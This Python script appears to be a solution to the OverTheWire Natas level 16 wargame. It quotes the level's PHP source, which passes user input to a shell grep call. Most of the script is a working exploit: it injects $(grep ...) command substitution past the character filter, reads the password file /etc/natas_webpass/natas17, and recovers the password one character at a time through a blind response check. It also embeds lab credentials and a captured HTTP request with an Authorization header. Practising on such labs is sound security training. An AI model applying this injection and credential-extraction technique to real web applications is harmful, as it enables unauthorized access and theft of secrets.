'''
Created on Aug 22, 2018

source: https://www.abatchy.com/2016/11/natas-level-16

source code for web page:
<pre>
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&`\'"]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i \"$key\" dictionary.txt");
    }
}
?>
</pre>

'''

import requests
from requests.auth import HTTPBasicAuth
 
chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
chars_in_passwd = list("")
passwd = list("")
 
# Find chars appearing in password
for char in chars:    
    r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ' + char + ' /etc/natas_webpass/natas17)', 
                      auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
     
    if ("doomed" not in r.text):       
        chars_in_passwd.append(char)
 
# Find password
for i in range(0, 32):
    for char in chars_in_passwd:
        if len(passwd) == i:
            passwd.append(char)
        else:
            passwd[i] = char
         
        passwd_str = "".join(passwd)
        # ^: Line starts with the string
        r = requests.get('http://natas16.natas.labs.overthewire.org/?needle=doomed$(grep ^' + passwd_str + ' /etc/natas_webpass/natas17)', 
                          auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'))
         
        if ("doomed" not in r.text):       
            break
     
    print("".join(passwd))
        
# REQUEST
# GET /?needle=test HTTP/1.1
# Host: natas16.natas.labs.overthewire.org
# User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Accept-Encoding: gzip, deflate
# Cookie: __cfduid=dfc19891ef710d8915a1f14a600ae2b271534787266; __utma=176859643.1042007831.1534787267.1534795773.1534850371.3; __utmz=176859643.1534787267.1.1.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); __utmc=176859643
# Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==
# Connection: close
# Upgrade-Insecure-Requests: 1
